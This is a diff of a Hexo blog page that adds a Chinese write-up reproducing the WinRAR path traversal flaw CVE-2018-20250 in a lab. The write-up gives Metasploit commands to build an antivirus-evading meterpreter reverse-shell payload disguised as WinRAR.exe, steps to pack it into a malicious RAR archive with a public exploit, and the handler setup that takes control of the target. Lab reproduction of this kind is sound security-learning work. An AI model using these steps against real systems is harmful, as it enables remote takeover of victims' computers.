@@ -248,7 +248,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/03/15/Writeup-on-CVE-2018-20250/" itemprop="url">'Writeup-on-CVE-2018-20250'</a></h1>
+                <a class="post-title-link" href="/2019/03/15/Writeup-on-CVE-2018-20250/" itemprop="url">'WinRAR目录穿越漏洞复现（CVE-2018-20250）'</a></h1>
         
 
         <div class="post-meta">
@@ -300,7 +300,62 @@
       
         
           
-            
+            <h1 id="1-漏洞细节"><a href="#1-漏洞细节" class="headerlink" title="1.漏洞细节"></a>1.漏洞细节</h1><blockquote>
+<p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p>
+</blockquote>
+<h1 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2.漏洞影响版本"></a>2.漏洞影响版本</h1><blockquote>
+<p>WinRAR &lt; 5.70 Beta 1</p>
+<p>Bandizip &lt; = 6.2.0.0(笔者没有测试Bandzip，有兴趣的师傅可以自行测试)</p>
+<p>好压(2345压缩) &lt; = 5.9.8.10907</p>
+<p>360压缩 &lt; = 4.0.0.1170</p>
+</blockquote>
+<h1 id="3-漏洞复现环境"><a href="#3-漏洞复现环境" class="headerlink" title="3.漏洞复现环境"></a>3.漏洞复现环境</h1><table>
+<thead>
+<tr>
+<th style="text-align:center">角色</th>
+<th style="text-align:center">系统版本</th>
+<th style="text-align:center">IP</th>
+<th style="text-align:center">备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">靶机</td>
+<td style="text-align:center">Windows7（64bit）</td>
+<td style="text-align:center">192.168.126.128</td>
+<td style="text-align:center">安装WinRAR版本为5.6.1，关闭防火墙</td>
+</tr>
+<tr>
+<td style="text-align:center">攻击机</td>
+<td style="text-align:center">Kali Linux 64 Bit <strong>2019.1a</strong></td>
+<td style="text-align:center">192.168.126.126</td>
+<td style="text-align:center">Metasploit版本为5.0.2</td>
+</tr>
+<tr>
+<td style="text-align:center">攻击机</td>
+<td style="text-align:center">WIndows10（64bit）</td>
+<td style="text-align:center"></td>
+<td style="text-align:center">安装Python3.7.2</td>
+</tr>
+</tbody>
+</table>
+<p>exp下载：<a href="https://github.com/WyAtu/CVE-2018-20250/" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-20250/</a></p>
+<h1 id="4-漏洞复现过程"><a href="#4-漏洞复现过程" class="headerlink" title="4.漏洞复现过程"></a>4.漏洞复现过程</h1><h2 id="4-1使用Metasploit5生成免杀Payload"><a href="#4-1使用Metasploit5生成免杀Payload" class="headerlink" title="4.1使用Metasploit5生成免杀Payload"></a>4.1使用Metasploit5生成免杀Payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use evasion/windows/windows_defender_exe</span><br><span class="line">show info</span><br><span class="line">set filename WinRAR.exe</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.126.126</span><br><span class="line">set lport 10260</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<img src="/2019/03/15/Writeup-on-CVE-2018-20250/01.evasion.png"> 
+<img src="/2019/03/15/Writeup-on-CVE-2018-20250/02.run.png"> 
+<h2 id="4-2使用exp生成恶意程序"><a href="#4-2使用exp生成恶意程序" class="headerlink" title="4.2使用exp生成恶意程序"></a>4.2使用exp生成恶意程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /root/Desktop</span><br><span class="line">git clone https://github.com/WyAtu/CVE-2018-20250.git</span><br><span class="line">cd CVE-2018-20250</span><br><span class="line">cp /root/.msf4/local/WinRAR.exe ./</span><br><span class="line">vim exp.py</span><br></pre></td></tr></table></figure>
+<p>将exp.py中的evil_filename = “calc.exe”改为”WinRAR.exe”</p>
+<img src="/2019/03/15/Writeup-on-CVE-2018-20250/03.edit.png"> 
+<p>将CVE-2018-20250文件夹复制到Windows10中，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py</span><br></pre></td></tr></table></figure>
+<p>生成恶意程序test.rar</p>
+<img src="/2019/03/15/Writeup-on-CVE-2018-20250/04.Evil.png"> 
+<h2 id="4-3在靶机上运行恶意程序"><a href="#4-3在靶机上运行恶意程序" class="headerlink" title="4.3在靶机上运行恶意程序"></a>4.3在靶机上运行恶意程序</h2><p>将test.rar复制到Windows7上，解压运行</p>
+<h2 id="4-4在Kali-Linux上执行Metasploit监听"><a href="#4-4在Kali-Linux上执行Metasploit监听" class="headerlink" title="4.4在Kali Linux上执行Metasploit监听"></a>4.4在Kali Linux上执行Metasploit监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.126.126</span><br><span class="line">set lport 10260</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h2 id="4-5控制靶机"><a href="#4-5控制靶机" class="headerlink" title="4.5控制靶机"></a>4.5控制靶机</h2><p>Windows7重启之后，Kali Linux会收到会话，此时执行shell即可获得靶机权限。</p>
+<img src="/2019/03/15/Writeup-on-CVE-2018-20250/05.session-opened.png"> 
+<h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h1><p>刚刚学了2个星期的渗透测试，仅仅做了漏洞复现，没有分析漏洞原理。</p>
+
           
         
       
@@ -465,134 +520,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/13/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="chessur">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="chessur">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/03/13/hello-world/" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-13T20:36:11+08:00">
-                2019-03-13
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -639,7 +566,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -647,6 +574,15 @@
 
             
 
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
             
 
           </nav>
